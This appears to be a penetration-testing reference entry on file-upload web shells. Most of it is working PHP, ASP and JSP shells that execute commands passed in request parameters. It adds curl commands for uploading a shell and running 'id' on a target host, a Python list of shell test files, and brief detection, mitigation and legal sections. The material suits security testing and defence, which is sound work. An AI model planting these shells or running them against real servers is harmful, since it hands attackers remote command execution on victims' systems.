# File Upload Web Shells

## Overview
- Purpose: Web shell payloads for testing file upload vulnerabilities and achieving remote code execution
- Category: web_security
- Severity: critical
- Tags: file-upload, web-shell, payload, RCE, PHP, ASP, JSP

## Context and Use-Cases
- Web shells are used to verify successful file upload exploitation
- Allow remote command execution on compromised server
- Used in penetration testing to demonstrate impact of file upload vulnerabilities
- Different shells for different server technologies (PHP, ASP, JSP)

## Web Shell Types

### 1. PHP Web Shells

#### Simple PHP Shell
```php
<?php system($_GET['cmd']); ?>
```
**Usage:**
```
https://target.com/uploads/shell.php?cmd=id
https://target.com/uploads/shell.php?cmd=whoami
https://target.com/uploads/shell.php?cmd=ls -la
```

**Characteristics:**
- Minimal code, easy to detect
- Executes commands via GET parameter
- Output directly in response

#### PHP Shell with POST
```php
<?php system($_POST['cmd']); ?>
```
**Usage:**
```bash
curl -X POST -d "cmd=id" https://target.com/uploads/shell.php
```

#### PHP Shell with Error Suppression
```php
<?php @system($_GET['cmd']); ?>
```
**Characteristics:**
- Suppresses error messages with `@` operator
- Harder to detect errors

#### PHP Shell with Output Capture
```php
<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>
```
**Characteristics:**
- Better formatted output
- Uses shell_exec instead of system
- Wraps output in HTML pre tags

### 2. ASP Web Shells

#### Simple ASP Shell
```asp
<%eval request("cmd")%>
```
**Usage:**
```
https://target.com/uploads/shell.asp?cmd=whoami
```

**Characteristics:**
- Evaluates code passed in request
- Dangerous as it executes arbitrary code
- Works on IIS servers

#### ASP Shell with Command Execution
```asp
<%
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec(Request.QueryString("cmd"))
Response.Write objExec.StdOut.ReadAll()
%>
```
**Characteristics:**
- More structured approach
- Uses WScript.Shell COM object
- Better output handling

### 3. JSP Web Shells

#### Simple JSP Shell
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```
**Usage:**
```
https://target.com/uploads/shell.jsp?cmd=id
```

**Characteristics:**
- Uses Java Runtime for command execution
- Works on Tomcat, JBoss, etc.
- Limited output visibility

#### JSP Shell with Output
```jsp
<%
    String cmd = request.getParameter("cmd");
    java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
    java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
%>
```
**Characteristics:**
- Captures and displays command output
- More complex but more functional
- Better for interactive use

## Examples

### Test File Generation
```python
# From FileUploadTesting.py
test_files = {
    "web_shells": [
        {
            "name": "simple_php_shell.php",
            "content": "<?php system($_GET['cmd']); ?>"
        },
        {
            "name": "asp_shell.asp",
            "content": "<%eval request(\"cmd\")%>"
        },
        {
            "name": "jsp_shell.jsp",
            "content": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
        }
    ]
}
```

### Upload and Test
```bash
# Upload PHP shell
curl -F "file=@simple_php_shell.php" https://target.com/upload

# Test execution
curl "https://target.com/uploads/simple_php_shell.php?cmd=id"

# Expected output:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Detection Indicators
```bash
# Search for web shell patterns
grep -r "system\|exec\|passthru\|shell_exec" /var/www/html/uploads/

# Check file permissions
ls -la /var/www/html/uploads/

# Monitor web server logs
tail -f /var/log/apache2/access.log | grep "cmd="
```

## Mitigation and Detection
- Monitor for suspicious file uploads
- Scan uploaded files with antivirus/malware detection
- Implement file integrity monitoring
- Restrict file execution in upload directories
- Use Web Application Firewall (WAF) rules
- Monitor for suspicious command execution patterns
- Implement proper access controls
- Regular security audits and penetration testing

## Legal and Ethical Considerations
- Web shells should only be used in authorized security testing
- Unauthorized access is illegal
- Always obtain written permission before testing
- Document all testing activities
- Report findings responsibly
